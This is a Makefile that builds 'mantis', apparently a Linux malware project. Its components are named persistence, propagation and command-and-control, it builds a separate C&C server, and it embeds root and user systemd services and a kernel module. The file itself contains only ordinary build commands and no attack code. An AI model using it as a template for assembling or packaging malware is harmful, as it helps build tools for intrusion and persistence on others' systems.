#!/usr/bin/make

# config
strip_executable = false
force_static     = false

# config for production - I'd use it always but it makes debugging a
# pain in the ass
#strip_executable = true
#force_static     = true

mantis: objects cnc_server mantis_service_user mantis_service_root mantis_ko_c
	gcc src/main.c -o objects/main.o -c
	gcc src/auxiliary.c -o objects/auxiliary.o -c
	gcc src/persistence.c -o objects/persistence.o -c
	gcc src/techniques.c -o objects/techniques.o  -c
	gcc src/propogation.c -o objects/propogation.o -c
	gcc src/cnc.c -o objects/cnc.o -c

ifeq ($(force_static),true)
	gcc -o mantis objects/main.o objects/auxiliary.o objects/persistence.o objects/techniques.o objects/propogation.o objects/cnc.o -static
else
	gcc -o mantis objects/main.o objects/auxiliary.o objects/persistence.o objects/techniques.o objects/propogation.o objects/cnc.o
endif

ifeq ($(strip_executable),true)
	strip mantis
endif

cnc_server:
	gcc src/cnc/cnc_server.c -o cnc_server

mantis_service_user:
	xxd -i src/embeds/mantis_service_user.service > src/embeds/mantis_service_user.service.h

mantis_service_root:
	xxd -i src/embeds/mantis_service_root.service > src/embeds/mantis_service_root.service.h

mantis_ko_c:
	xxd -i src/embeds/mantis.ko.c > src/embeds/mantis.ko.c.h

objects:
	mkdir objects

clean:
	-rm -r objects
	-rm mantis
	-rm cnc_server

